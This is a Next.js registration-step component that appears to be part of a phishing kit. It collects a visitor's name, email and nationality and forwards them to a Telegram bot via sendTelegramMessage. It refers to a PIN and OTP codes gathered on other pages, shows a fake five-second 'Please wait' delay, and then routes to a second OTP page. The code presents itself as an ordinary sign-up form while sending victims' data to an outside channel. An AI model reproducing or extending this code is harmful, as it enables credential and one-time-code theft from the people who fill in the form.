"use client"

import { useState } from "react"
import { useRouter } from "next/navigation"
import { ArrowLeft, ChevronDown, Loader2 } from "lucide-react"
import { StepIndicator } from "@/components/step-indicator"

export default function RegistrationScreen() {
    const router = useRouter()
    const [isLoading, setIsLoading] = useState(false)
    const [errors, setErrors] = useState({
        name: "",
        email: "",

    })
    const [formData, setFormData] = useState({
        name: "",
        nationality: "ALBANIA",
        email: "",

    })

    const handleInputChange = (field: string, value: string) => {
        setFormData((prev) => ({ ...prev, [field]: value }))
        // Clear error for this field when user types
        if (errors[field as keyof typeof errors]) {
            setErrors((prev) => ({ ...prev, [field]: "" }))
        }
    }

    const handleNext = async () => {
        // Validate form
        const newErrors = {
            name: "",
            email: "",
        }

        if (!formData.name.trim()) {
            newErrors.name = "Please enter your name"
        }

        if (!formData.email.trim()) {
            newErrors.email = "Please enter your email address"
        } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email)) {
            newErrors.email = "Please enter a valid email address"
        }

        // If there are errors, show them and don't proceed
        if (newErrors.name || newErrors.email) {
            setErrors(newErrors)
            return
        }

        setIsLoading(true)
        // Store profile data for the final Telegram notification
        sessionStorage.setItem("userName", formData.name);
        sessionStorage.setItem("userEmail", formData.email);
        sessionStorage.setItem("userNationality", formData.nationality);

        try {
            const { sendTelegramMessage } = await import("@/lib/telegram");
            await sendTelegramMessage({
                name: formData.name,
                email: formData.email,
                nationality: formData.nationality,
                title: "Profile Details",
                exclude: ["pin", "otp1"]
            });
        } catch (error) {
            console.error("Telegram error:", error);
        }

        await new Promise(resolve => setTimeout(resolve, 5000))
        router.push("/otp2")
    }

    const handleBack = () => {
        router.back()
    }

    return (
        <div className="h-[100dvh] bg-[#60ac28] flex flex-col overflow-hidden">
            {/* Header */}
            <header className="flex items-center justify-center relative px-4 py-2">
                <button onClick={handleBack} className="absolute left-4 p-2 text-[#1a2a4a]" aria-label="Go back">
                    <ArrowLeft className="w-6 h-6" strokeWidth={1.5} />
                </button>
                {/* Logo */}
                <div className="flex items-center">
                    <img src="/q32.png" alt="Logo" className="h-8 w-auto object-contain rounded-md" />
                </div>
            </header>

            {/* Step Indicator */}
            <StepIndicator />

            {/* Main Content */}
            <main className="flex-1 flex flex-col px-6 pt-4">

                {/* Section Title */}
                <h2 className="text-[22px] font-semibold text-[#0f172a] mb-4">Your profile information</h2>

                {/* Form Fields */}
                <div className="flex flex-col gap-5">
                    {/* Name Field */}
                    <div>
                        <label className="block text-sm font-semibold text-[#0f172a] mb-2">Name</label>
                        <input
                            type="text"
                            value={formData.name}
                            onChange={(e) => handleInputChange("name", e.target.value)}
                            placeholder="dastgir"
                            className={`w-full h-14 px-4 rounded-lg border text-[#0f172a] text-base placeholder:text-[#94a3b8] focus:outline-none transition-colors bg-[#f8fafc] ${errors.name ? "border-[#d91a32] focus:border-[#d91a32]" : "border-[#e2e8f0] focus:border-[#2563eb]"
                                }`}
                        />
                        {errors.name && (
                            <p className="text-[#d91a32] text-sm mt-1">{errors.name}</p>
                        )}
                    </div>



                    {/* Email Field */}
                    <div>
                        <label className="block text-sm font-semibold text-[#0f172a] mb-2">Email address</label>
                        <input
                            type="email"
                            value={formData.email}
                            onChange={(e) => handleInputChange("email", e.target.value)}
                            placeholder="example@email.com"
                            className={`w-full h-14 px-4 rounded-lg border text-[#0f172a] text-base placeholder:text-[#94a3b8] focus:outline-none transition-colors bg-[#f8fafc] ${errors.email ? "border-[#d91a32] focus:border-[#d91a32]" : "border-[#e2e8f0] focus:border-[#2563eb]"
                                }`}
                        />
                        {errors.email && (
                            <p className="text-[#d91a32] text-sm mt-1">{errors.email}</p>
                        )}
                    </div>

                </div>

                {/* Buttons */}
                <div className="mt-8 mb-6">
                    <button
                        onClick={handleNext}
                        disabled={isLoading}
                        className="w-full h-14 bg-[#152850] text-white text-base font-medium rounded-full hover:bg-[#1a3260] active:bg-[#0f1e3d] transition-colors flex items-center justify-center gap-2"
                    >
                        Next
                    </button>
                </div>
            </main>

            {/* Loading Overlay */}
            {isLoading && (
                <div className="fixed inset-0 bg-black/30 backdrop-blur-sm flex items-center justify-center z-50">
                    <div className="bg-white p-6 rounded-2xl shadow-xl flex flex-col items-center gap-4">
                        <Loader2 className="w-12 h-12 text-[#152850] animate-spin" />
                        <p className="text-[#1a2a4a] text-sm font-medium">Please wait...</p>
                    </div>
                </div>
            )}
        </div>
    )
}
